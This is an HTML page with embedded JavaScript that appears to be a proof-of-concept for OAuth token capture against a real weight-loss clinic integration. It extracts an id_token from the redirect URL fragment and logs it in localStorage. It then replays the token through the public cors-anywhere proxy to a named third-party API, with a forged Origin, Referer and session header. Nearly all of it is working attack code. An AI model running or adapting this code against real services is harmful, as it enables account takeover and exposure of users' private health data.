<!DOCTYPE html>
<html>
<head>
  <title>OAuth Token Capture</title>
</head>
<body>
  <h1>OAuth Token Capture (Static GitHub Page)xxx</h1>
  <p id="status">Waiting for token...</p>
  <textarea id="log" rows="20" cols="100" readonly></textarea>
  <button onclick="makeAuthorizedRequest()">🌐 Send Authenticated Request</button>
  <iframe id="responseFrame" style="width:100%; height:300px; border:1px solid #ccc; margin-top:1em;"></iframe>

  <script>
    const hash = window.location.hash;
    const regexMatch = hash.match(/\/auth#(.*?)\&state=/);
    const id_token = regexMatch ? regexMatch[1] : null;

    const logBox = document.getElementById("log");
    const status = document.getElementById("status");

    if (id_token) {
      const shortToken = id_token.slice(0, 20) + '...' + id_token.slice(-20); // Truncate token
      const time = new Date().toISOString();
      const entry = `--- ${time} ---\nToken: ${shortToken}\nURL: ${window.location.href.split("#")[0]}\n\n`;

      const existing = localStorage.getItem("token_logs") || "";
      const updated = existing + entry;
      localStorage.setItem("token_logs", updated);

      logBox.value = updated;
      status.textContent = "✅ Token captured and saved in your browser (localStorage).";
    } else {
      status.textContent = "⚠️ No id_token found in URL fragment.";
      logBox.value = localStorage.getItem("token_logs") || "";
    }

    function makeAuthorizedRequest() {
      if (!id_token) return alert("No token found to send");

      const proxyUrl = "https://cors-anywhere.herokuapp.com/";
      const targetUrl = "https://ww-integration-api.joinsequence.com/api/v1/ww/clinic-tab-init?locale=en-US&path=%2F";

      fetch(proxyUrl + targetUrl, {
        method: "GET",
        headers: {
          "Authorization": `Bearer ${id_token}`,
          "Accept": "application/json, text/plain, */*",
          "Ww-Ssid": "en-US-1466641065.1750185",
          "Ww-Client": "rsw",
          "Origin": "https://www.weightwatchers.com",
          "Referer": "https://www.weightwatchers.com/"
        }
      })
      .then(response => response.text())
      .then(data => {
        const frame = document.getElementById("responseFrame");
        frame.srcdoc = `<pre>${data.replace(/</g, '&lt;')}</pre>`;
      })
      .catch(err => alert("Error making request: " + err));
    }
  </script>
</body>
</html>
